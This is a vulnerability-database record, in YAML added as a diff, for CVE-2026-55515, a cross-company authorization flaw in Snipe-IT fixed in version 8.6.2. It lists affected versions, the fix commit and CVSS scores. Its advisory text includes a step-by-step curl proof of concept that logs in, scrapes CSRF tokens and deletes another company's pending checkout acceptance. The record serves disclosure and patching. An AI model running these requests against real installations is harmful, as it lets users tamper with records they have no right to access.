@@ -1,0 +1,383 @@
+advisory_id: GHSA-35cr-9hqq-p2mg
+datasource_id: github_osv/GHSA-35cr-9hqq-p2mg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-35cr-9hqq-p2mg/GHSA-35cr-9hqq-p2mg.json
+aliases:
+  - CVE-2026-55515
+summary: "Snipe-IT: Cross-company deletion of pending checkout acceptances via unscoped report\
+  \ endpoint\n### Impact\nA user with the `reports.view` permission can delete pending checkout\
+  \ acceptance records by global ID, even when the acceptance belongs to an asset in another\
+  \ company.\n\nThe report listing page appears to scope visible unaccepted assets, but the\
+  \ delete endpoint directly looks up CheckoutAcceptance::pending()->find($acceptanceId) and\
+  \ deletes it without checking whether the current user has access to the related checkoutable\
+  \ asset.\n\n\n### Preconditions\nThe attacker needs:\n- A valid authenticated web session.\n\
+  - `reports.view` permission.\n- Knowledge or guessability of a pending `checkout_acceptances.id`.\n\
+  \nThe attacker does not need access to the asset/company associated with the target acceptance.\n\
+  \n### Root cause\nThe delete action authorizes only report access, then deletes a pending\
+  \ acceptance by global ID:\n\n```php\n\n$this->authorize('reports.view');\n\n$acceptance =\
+  \ CheckoutAcceptance::pending()->find($acceptanceId);\n\n$acceptance->delete();\n```\n\nThe\
+  \ code does not check whether the current user can access the acceptance’s related checkoutable\
+  \ asset/accessory/license/etc.\nIn multi-company mode, this allows a reports user from one\
+  \ company to delete acceptance records belonging to another company.\n\n### Proof of concept\n\
+  #### Target acceptance belongs to Company B\n\nThe target pending acceptance was identified\
+  \ as id=1.\n\n```sql\nsnipe_sql \"SELECT ca.id ca.checkoutable_id, ca.deleted_at, a.asset_tag,\
+  \ a.company_id\nFROM checkout_acceptances ca\nJOIN assets a ON a.id = ca.checkoutable_id\n\
+  WHERE ca.id=$ACCEPTANCE_B_ID;\"\n```\nObserved result:\n\n```json\n{\n    \"id\": 1,\n   \
+  \ \"checkoutable_id\": 2,\n    \"deleted_at\": null,\n    \"asset_tag\": \"LAB-B-42445107\"\
+  ,\n    \"company_id\": 3\n}\n```\n\nThis shows the pending acceptance belongs to asset 2,\
+  \ which is in Company B.\n\n#### Attacker user belongs to Company A\nThe attacker account\
+  \ was reporter_a, assigned to Company A with only report viewing permission:\n\n```json\n\
+  {\n    \"id\": 3,\n    \"username\": \"reporter_a\",\n    \"company_id\": 2,\n    \"permissions\"\
+  : {\n        \"reports.view\": 1\n    }\n}\n```\n\nLogin as Company A reports user\n\n```curl\n\
+  curl -sS -c /tmp/snipe_cookie.txt \"$BASE/login\" -o /tmp/snipe_login.html\n\nLOGIN_CSRF=$(grep\
+  \ -oP 'name=\"_token\" value=\"\\K[^\"]+' /tmp/snipe_login.html)\n\ncurl -sS -i -b /tmp/snipe_cookie.txt\
+  \ -c /tmp/snipe_cookie.txt \\\n  -X POST \"$BASE/login\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\"\
+  \ \\\n  --data-urlencode \"_token=$LOGIN_CSRF\" \\\n  --data-urlencode \"username=reporter_a\"\
+  \ \\\n  --data-urlencode \"password=password\"\n```\n\n**Observed response:**\n\n```HTTP/1.1\
+  \ 302 Found\nLocation: http://localhost:8000/\n```\n\nFetch report CSRF token\n\n```curl\n\
+  curl -sS -L -b /tmp/snipe_cookie.txt -c /tmp/snipe_cookie.txt \\\n  \"$BASE/reports/unaccepted_assets\"\
+  \ \\\n  -o /tmp/unaccepted.html \\\n  -w \"\\nHTTP=%{http_code} URL=%{url_effective}\\n\"\n\
+  \n\nCSRF=$(grep -oP 'name=\"csrf-token\" content=\"\\K[^\"]+' /tmp/unaccepted.html)\n\necho\
+  \ \"CSRF=$CSRF\"\n```\n\n**Observed result:**\n\n```\nHTTP=200 URL=http://localhost:8000/reports/unaccepted_assets\n\
+  CSRF=aRwAVRk5sPLdl7Pbw8vCQJRXN9vTqxVilkgH8JkU\n```\n\n**Delete Company B acceptance as Company\
+  \ A reporter**\n\n```curl\ncurl -i -b /tmp/snipe_cookie.txt -c /tmp/snipe_cookie.txt \\\n\
+  \  -X POST \"$BASE/reports/unaccepted_assets/$ACCEPTANCE_B_ID/delete\" \\\n  -H \"Content-Type:\
+  \ application/x-www-form-urlencoded\" \\\n  --data-urlencode \"_token=$CSRF\" \\\n  --data-urlencode\
+  \ \"_method=DELETE\"\n```\n\n**Observed response:**\n```\nHTTP/1.1 302 Found\nLocation: http://localhost:8000/reports/unaccepted_assets\n\
+  ```\n\n**Final state**\n```sql \nsnipe_sql \"SELECT id, checkoutable_id, deleted_at\nFROM\
+  \ checkout_acceptances\nWHERE id=$ACCEPTANCE_B_ID;\"\n```\n\n**Observed result:**\n\n```json\n\
+  {\n    \"id\": 1,\n    \"checkoutable_id\": 2,\n    \"deleted_at\": \"2026-06-12 04:30:00\"\
+  \n}\n```\n\nThis confirms that reporter_a from Company A deleted a pending acceptance for\
+  \ Company B’s asset.\n\n### Security impact\nThis is a cross-company authorization bypass\
+  \ affecting checkout acceptance integrity.\nAn attacker with report access can:\n\n- Delete\
+  \ pending acceptance records for assets they cannot access.\n- Suppress evidence that a user\
+  \ has not accepted custody or terms.\n- Interfere with asset handoff/compliance workflows.\n\
+  - Tamper with another company’s pending acceptance queue.\n\nThis is not intended functionality\
+  \ because the application should enforce company scope on destructive actions, not only on\
+  \ report display."
+impacted_packages:
+  - purl: pkg:composer/snipe/snipe-it
+    affected_versions: vers:composer/<=8.6.1
+    fixed_versions: vers:composer/8.6.2
+    affected_packages:
+      - pkg:composer/snipe/snipe-it@0.1.0
+      - pkg:composer/snipe/snipe-it@0.1.1
+      - pkg:composer/snipe/snipe-it@0.1.2
+      - pkg:composer/snipe/snipe-it@0.2.0
+      - pkg:composer/snipe/snipe-it@0.3.0-alpha
+      - pkg:composer/snipe/snipe-it@0.3.7-alpha
+      - pkg:composer/snipe/snipe-it@0.3.8-alpha
+      - pkg:composer/snipe/snipe-it@0.3.9-alpha
+      - pkg:composer/snipe/snipe-it@0.3.10-alpha
+      - pkg:composer/snipe/snipe-it@0.3.11-alpha
+      - pkg:composer/snipe/snipe-it@1.0.0
+      - pkg:composer/snipe/snipe-it@1.1.0
+      - pkg:composer/snipe/snipe-it@1.2.0
+      - pkg:composer/snipe/snipe-it@1.2.1
+      - pkg:composer/snipe/snipe-it@1.2.2
+      - pkg:composer/snipe/snipe-it@1.2.3-beta
+      - pkg:composer/snipe/snipe-it@1.2.3
+      - pkg:composer/snipe/snipe-it@1.2.4-beta
+      - pkg:composer/snipe/snipe-it@1.2.4
+      - pkg:composer/snipe/snipe-it@1.2.5
+      - pkg:composer/snipe/snipe-it@1.2.6-beta
+      - pkg:composer/snipe/snipe-it@1.2.6
+      - pkg:composer/snipe/snipe-it@1.2.6%2B1
+      - pkg:composer/snipe/snipe-it@1.2.7-beta
+      - pkg:composer/snipe/snipe-it@1.2.7
+      - pkg:composer/snipe/snipe-it@1.2.8
+      - pkg:composer/snipe/snipe-it@1.2.9
+      - pkg:composer/snipe/snipe-it@1.2.10
+      - pkg:composer/snipe/snipe-it@1.2.11
+      - pkg:composer/snipe/snipe-it@2.0.0-RC-1
+      - pkg:composer/snipe/snipe-it@2.0.0-beta
+      - pkg:composer/snipe/snipe-it@2.0.0
+      - pkg:composer/snipe/snipe-it@2.0.1
+      - pkg:composer/snipe/snipe-it@2.0.2
+      - pkg:composer/snipe/snipe-it@2.0.3
+      - pkg:composer/snipe/snipe-it@2.0.4
+      - pkg:composer/snipe/snipe-it@2.0.5
+      - pkg:composer/snipe/snipe-it@2.0.6
+      - pkg:composer/snipe/snipe-it@2.1.0
+      - pkg:composer/snipe/snipe-it@2.1.1
+      - pkg:composer/snipe/snipe-it@2.1.2
+      - pkg:composer/snipe/snipe-it@3.0.0-alpha
+      - pkg:composer/snipe/snipe-it@3.0.0-alpha2
+      - pkg:composer/snipe/snipe-it@3.0.0-beta
+      - pkg:composer/snipe/snipe-it@3.0.0-beta.1
+      - pkg:composer/snipe/snipe-it@3.0.0-beta.2
+      - pkg:composer/snipe/snipe-it@3.0.0-beta.3
+      - pkg:composer/snipe/snipe-it@3.0.0
+      - pkg:composer/snipe/snipe-it@3.1.0
+      - pkg:composer/snipe/snipe-it@3.2.0
+      - pkg:composer/snipe/snipe-it@3.3.0-beta
+      - pkg:composer/snipe/snipe-it@3.3.0
+      - pkg:composer/snipe/snipe-it@3.4.0-alpha
+      - pkg:composer/snipe/snipe-it@3.4.0-beta
+      - pkg:composer/snipe/snipe-it@3.4.0
+      - pkg:composer/snipe/snipe-it@3.5.0-beta
+      - pkg:composer/snipe/snipe-it@3.5.0-beta2
+      - pkg:composer/snipe/snipe-it@3.5.0
+      - pkg:composer/snipe/snipe-it@3.5.1
+      - pkg:composer/snipe/snipe-it@3.5.2
+      - pkg:composer/snipe/snipe-it@3.6.0
+      - pkg:composer/snipe/snipe-it@3.6.1
+      - pkg:composer/snipe/snipe-it@3.6.2
+      - pkg:composer/snipe/snipe-it@3.6.3
+      - pkg:composer/snipe/snipe-it@3.6.4
+      - pkg:composer/snipe/snipe-it@3.6.5
+      - pkg:composer/snipe/snipe-it@3.6.6
+      - pkg:composer/snipe/snipe-it@4.0.0-alpha
+      - pkg:composer/snipe/snipe-it@4.0.0-alpha-2
+      - pkg:composer/snipe/snipe-it@4.0.0-beta
+      - pkg:composer/snipe/snipe-it@4.0.0-beta2
+      - pkg:composer/snipe/snipe-it@4.0.0-beta3
+      - pkg:composer/snipe/snipe-it@4.0.0-beta4
+      - pkg:composer/snipe/snipe-it@4.0.0-beta5
+      - pkg:composer/snipe/snipe-it@4.0.0-beta6
+      - pkg:composer/snipe/snipe-it@4.0.0
+      - pkg:composer/snipe/snipe-it@4.0.1
+      - pkg:composer/snipe/snipe-it@4.0.2
+      - pkg:composer/snipe/snipe-it@4.0.3
+      - pkg:composer/snipe/snipe-it@4.0.4
+      - pkg:composer/snipe/snipe-it@4.0.5
+      - pkg:composer/snipe/snipe-it@4.0.6
+      - pkg:composer/snipe/snipe-it@4.0.7
+      - pkg:composer/snipe/snipe-it@4.0.8
+      - pkg:composer/snipe/snipe-it@4.0.9
+      - pkg:composer/snipe/snipe-it@4.0.10
+      - pkg:composer/snipe/snipe-it@4.0.11
+      - pkg:composer/snipe/snipe-it@4.0.12
+      - pkg:composer/snipe/snipe-it@4.0.13
+      - pkg:composer/snipe/snipe-it@4.0.14
+      - pkg:composer/snipe/snipe-it@4.0.15
+      - pkg:composer/snipe/snipe-it@4.1.0-beta
+      - pkg:composer/snipe/snipe-it@4.1.0-beta2
+      - pkg:composer/snipe/snipe-it@4.1.0
+      - pkg:composer/snipe/snipe-it@4.1.1
+      - pkg:composer/snipe/snipe-it@4.1.2
+      - pkg:composer/snipe/snipe-it@4.1.3
+      - pkg:composer/snipe/snipe-it@4.1.4
+      - pkg:composer/snipe/snipe-it@4.1.5
+      - pkg:composer/snipe/snipe-it@4.1.6
+      - pkg:composer/snipe/snipe-it@4.1.7
+      - pkg:composer/snipe/snipe-it@4.1.8
+      - pkg:composer/snipe/snipe-it@4.1.9
+      - pkg:composer/snipe/snipe-it@4.1.10
+      - pkg:composer/snipe/snipe-it@4.1.11
+      - pkg:composer/snipe/snipe-it@4.1.12
+      - pkg:composer/snipe/snipe-it@4.1.13
+      - pkg:composer/snipe/snipe-it@4.1.14
+      - pkg:composer/snipe/snipe-it@4.2.0
+      - pkg:composer/snipe/snipe-it@4.3.0
+      - pkg:composer/snipe/snipe-it@4.4.0
+      - pkg:composer/snipe/snipe-it@4.4.1
+      - pkg:composer/snipe/snipe-it@4.5.0
+      - pkg:composer/snipe/snipe-it@4.6.0
+      - pkg:composer/snipe/snipe-it@4.6.1
+      - pkg:composer/snipe/snipe-it@4.6.2
+      - pkg:composer/snipe/snipe-it@4.6.3
+      - pkg:composer/snipe/snipe-it@4.6.4
+      - pkg:composer/snipe/snipe-it@4.6.5
+      - pkg:composer/snipe/snipe-it@4.6.6
+      - pkg:composer/snipe/snipe-it@4.6.7
+      - pkg:composer/snipe/snipe-it@4.6.8
+      - pkg:composer/snipe/snipe-it@4.6.9
+      - pkg:composer/snipe/snipe-it@4.6.10
+      - pkg:composer/snipe/snipe-it@4.6.11
+      - pkg:composer/snipe/snipe-it@4.6.12
+      - pkg:composer/snipe/snipe-it@4.6.13
+      - pkg:composer/snipe/snipe-it@4.6.14
+      - pkg:composer/snipe/snipe-it@4.6.15
+      - pkg:composer/snipe/snipe-it@4.6.16
+      - pkg:composer/snipe/snipe-it@4.6.17
+      - pkg:composer/snipe/snipe-it@4.6.18
+      - pkg:composer/snipe/snipe-it@4.7.0
+      - pkg:composer/snipe/snipe-it@4.7.1
+      - pkg:composer/snipe/snipe-it@4.7.2
+      - pkg:composer/snipe/snipe-it@4.7.3
+      - pkg:composer/snipe/snipe-it@4.7.4
+      - pkg:composer/snipe/snipe-it@4.7.5
+      - pkg:composer/snipe/snipe-it@4.7.6
+      - pkg:composer/snipe/snipe-it@4.7.7
+      - pkg:composer/snipe/snipe-it@4.7.8
+      - pkg:composer/snipe/snipe-it@4.8.0
+      - pkg:composer/snipe/snipe-it@4.9.0
+      - pkg:composer/snipe/snipe-it@4.9.1
+      - pkg:composer/snipe/snipe-it@4.9.2
+      - pkg:composer/snipe/snipe-it@4.9.3
+      - pkg:composer/snipe/snipe-it@4.9.4
+      - pkg:composer/snipe/snipe-it@4.9.5
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-1.0
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-1.1
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-2
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-3.0
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-4
+      - pkg:composer/snipe/snipe-it@5.0.0-beta-5
+      - pkg:composer/snipe/snipe-it@5.0.0
+      - pkg:composer/snipe/snipe-it@5.0.1
+      - pkg:composer/snipe/snipe-it@5.0.2
+      - pkg:composer/snipe/snipe-it@5.0.3
+      - pkg:composer/snipe/snipe-it@5.0.4
+      - pkg:composer/snipe/snipe-it@5.0.5
+      - pkg:composer/snipe/snipe-it@5.0.6
+      - pkg:composer/snipe/snipe-it@5.0.7
+      - pkg:composer/snipe/snipe-it@5.0.8
+      - pkg:composer/snipe/snipe-it@5.0.9
+      - pkg:composer/snipe/snipe-it@5.0.10
+      - pkg:composer/snipe/snipe-it@5.0.11
+      - pkg:composer/snipe/snipe-it@5.0.12
+      - pkg:composer/snipe/snipe-it@5.1.0
+      - pkg:composer/snipe/snipe-it@5.1.1
+      - pkg:composer/snipe/snipe-it@5.1.2
+      - pkg:composer/snipe/snipe-it@5.1.3
+      - pkg:composer/snipe/snipe-it@5.1.4
+      - pkg:composer/snipe/snipe-it@5.1.5
+      - pkg:composer/snipe/snipe-it@5.1.6
+      - pkg:composer/snipe/snipe-it@5.1.7
+      - pkg:composer/snipe/snipe-it@5.1.8
+      - pkg:composer/snipe/snipe-it@5.2.0
+      - pkg:composer/snipe/snipe-it@5.3.0
+      - pkg:composer/snipe/snipe-it@5.3.1
+      - pkg:composer/snipe/snipe-it@5.3.2
+      - pkg:composer/snipe/snipe-it@5.3.3
+      - pkg:composer/snipe/snipe-it@5.3.4
+      - pkg:composer/snipe/snipe-it@5.3.5
+      - pkg:composer/snipe/snipe-it@5.3.6
+      - pkg:composer/snipe/snipe-it@5.3.7
+      - pkg:composer/snipe/snipe-it@5.3.8
+      - pkg:composer/snipe/snipe-it@5.3.9
+      - pkg:composer/snipe/snipe-it@5.3.10
+      - pkg:composer/snipe/snipe-it@5.4.0
+      - pkg:composer/snipe/snipe-it@5.4.1
+      - pkg:composer/snipe/snipe-it@5.4.2
+      - pkg:composer/snipe/snipe-it@5.4.3
+      - pkg:composer/snipe/snipe-it@5.4.4
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-1
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-2
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-3
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-4
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-5
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-6
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-7
+      - pkg:composer/snipe/snipe-it@6.0.0-RC-8
+      - pkg:composer/snipe/snipe-it@6.0.0
+      - pkg:composer/snipe/snipe-it@6.0.1
+      - pkg:composer/snipe/snipe-it@6.0.2
+      - pkg:composer/snipe/snipe-it@6.0.3
+      - pkg:composer/snipe/snipe-it@6.0.4
+      - pkg:composer/snipe/snipe-it@6.0.5
+      - pkg:composer/snipe/snipe-it@6.0.6
+      - pkg:composer/snipe/snipe-it@6.0.7
+      - pkg:composer/snipe/snipe-it@6.0.8
+      - pkg:composer/snipe/snipe-it@6.0.9
+      - pkg:composer/snipe/snipe-it@6.0.10
+      - pkg:composer/snipe/snipe-it@6.0.11
+      - pkg:composer/snipe/snipe-it@6.0.12
+      - pkg:composer/snipe/snipe-it@6.0.13
+      - pkg:composer/snipe/snipe-it@6.0.14
+      - pkg:composer/snipe/snipe-it@6.1.0
+      - pkg:composer/snipe/snipe-it@6.1.1
+      - pkg:composer/snipe/snipe-it@6.1.2
+      - pkg:composer/snipe/snipe-it@6.2.0
+      - pkg:composer/snipe/snipe-it@6.2.1
+      - pkg:composer/snipe/snipe-it@6.2.2
+      - pkg:composer/snipe/snipe-it@6.2.3
+      - pkg:composer/snipe/snipe-it@6.3.0
+      - pkg:composer/snipe/snipe-it@6.3.1
+      - pkg:composer/snipe/snipe-it@6.3.2
+      - pkg:composer/snipe/snipe-it@6.3.3
+      - pkg:composer/snipe/snipe-it@6.3.4
+      - pkg:composer/snipe/snipe-it@6.4.0
+      - pkg:composer/snipe/snipe-it@6.4.1
+      - pkg:composer/snipe/snipe-it@6.4.2
+      - pkg:composer/snipe/snipe-it@7.0.0
+      - pkg:composer/snipe/snipe-it@7.0.1
+      - pkg:composer/snipe/snipe-it@7.0.2
+      - pkg:composer/snipe/snipe-it@7.0.3
+      - pkg:composer/snipe/snipe-it@7.0.4
+      - pkg:composer/snipe/snipe-it@7.0.5
+      - pkg:composer/snipe/snipe-it@7.0.6
+      - pkg:composer/snipe/snipe-it@7.0.7
+      - pkg:composer/snipe/snipe-it@7.0.8
+      - pkg:composer/snipe/snipe-it@7.0.9
+      - pkg:composer/snipe/snipe-it@7.0.10
+      - pkg:composer/snipe/snipe-it@7.0.11
+      - pkg:composer/snipe/snipe-it@7.0.12
+      - pkg:composer/snipe/snipe-it@7.0.13
+      - pkg:composer/snipe/snipe-it@7.1.14
+      - pkg:composer/snipe/snipe-it@7.1.15
+      - pkg:composer/snipe/snipe-it@7.1.16
+      - pkg:composer/snipe/snipe-it@7.1.17
+      - pkg:composer/snipe/snipe-it@8.0.0
+      - pkg:composer/snipe/snipe-it@8.0.1
+      - pkg:composer/snipe/snipe-it@8.0.2
+      - pkg:composer/snipe/snipe-it@8.0.3
+      - pkg:composer/snipe/snipe-it@8.0.4
+      - pkg:composer/snipe/snipe-it@8.1.0
+      - pkg:composer/snipe/snipe-it@8.1.1
+      - pkg:composer/snipe/snipe-it@8.1.2
+      - pkg:composer/snipe/snipe-it@8.1.3
+      - pkg:composer/snipe/snipe-it@8.1.4
+      - pkg:composer/snipe/snipe-it@8.1.15
+      - pkg:composer/snipe/snipe-it@8.1.16
+      - pkg:composer/snipe/snipe-it@8.1.17
+      - pkg:composer/snipe/snipe-it@8.1.18
+      - pkg:composer/snipe/snipe-it@8.2.0
+      - pkg:composer/snipe/snipe-it@8.2.1
+      - pkg:composer/snipe/snipe-it@8.3.0
+      - pkg:composer/snipe/snipe-it@8.3.1
+      - pkg:composer/snipe/snipe-it@8.3.2
+      - pkg:composer/snipe/snipe-it@8.3.3
+      - pkg:composer/snipe/snipe-it@8.3.4
+      - pkg:composer/snipe/snipe-it@8.3.5
+      - pkg:composer/snipe/snipe-it@8.3.6
+      - pkg:composer/snipe/snipe-it@8.3.7
+      - pkg:composer/snipe/snipe-it@8.4.0
+      - pkg:composer/snipe/snipe-it@8.4.1
+      - pkg:composer/snipe/snipe-it@8.5.0
+      - pkg:composer/snipe/snipe-it@8.6.0
+      - pkg:composer/snipe/snipe-it@8.6.1
+    fixed_packages:
+      - pkg:composer/snipe/snipe-it@8.6.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/grokability/snipe-it
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/grokability/snipe-it
+        commit: 802067f3987a4b65bfc2efe60e22e07c24e01e6a
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-35cr-9hqq-p2mg/GHSA-35cr-9hqq-p2mg.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-639
+references:
+  - url: https://github.com/grokability/snipe-it
+    reference_type:
+    reference_id:
+  - url: https://github.com/grokability/snipe-it/commit/802067f3987a4b65bfc2efe60e22e07c24e01e6a
+    reference_type: other
+    reference_id: 802067f3987a4b65bfc2efe60e22e07c24e01e6a
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-55515
+    reference_type:
+    reference_id: CVE-2026-55515
+  - url: https://github.com/grokability/snipe-it/security/advisories/GHSA-35cr-9hqq-p2mg
+    reference_type: other
+    reference_id: GHSA-35cr-9hqq-p2mg
+  - url: https://github.com/grokability/snipe-it/releases/tag/v8.6.2
+    reference_type: other
+    reference_id: v8.6.2
+exploits: []
